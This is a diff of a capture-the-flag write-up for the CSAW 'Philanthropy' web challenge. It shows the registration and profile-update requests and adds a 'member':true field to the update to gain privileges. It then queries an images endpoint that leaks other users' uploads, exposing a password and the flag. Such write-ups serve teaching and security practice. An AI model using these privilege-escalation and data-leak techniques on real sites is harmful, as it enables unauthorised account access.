@@ -1,9 +1,32 @@
-# Chall description
+Start by checking the website:
+http://web.csaw.io:14180/web/home
 
-Can you break into the Philanthropy website and get more information on Snake and Otacon?
+This displays a simple registration form. Running it through burp revealed:
+```
+/identify/register:
 
-# Write up
+{"username":"test1@test.com","password":"test","first_name":"test","last_name":"test"}
+```
 
-Navigating to the webpage reveals a login form where I could register for a new account. Doing this and looking around revealed a control panel that would let me update the account name. There was also a `member` field. Trying to update this field just like the names are updated allowed to escalate the account to member.
+And trying to update a profile with a new first name showed:
+```
+/identify/update:
+{"username":"test1@test.com","first_name":"test2","last_name":"test"}
+```
 
-Once a member, I could identify an API call to images with an email in the query, and the response leaked several emails to try. One of these was `solidsnake@protonmail.com`, the account mentioned in the description, and looking it up revealed an image with the flag written.
+So, with this, I could force my profile to be a member by manipulating the update request:
+```
+{"username":"test1@test.com","first_name":"test2","last_name":"test","member":true}
+```
+
+With a member profile I got access to a new page with a quiz. Loading it revealed:
+http://web.csaw.io:14180/identity/images?user=%22otacon@protonmail.com%22
+which leaks usernames and their uploads
+
+The description asked to get information on solidsnake and otacon, so trying:
+http://web.csaw.io:14180/identity/images?user=%22solidsnake@protonmail.com%22
+reveals 
+![](./Images/password.png)
+
+Login in with solidsnake:
+![](./Images/flag.png)
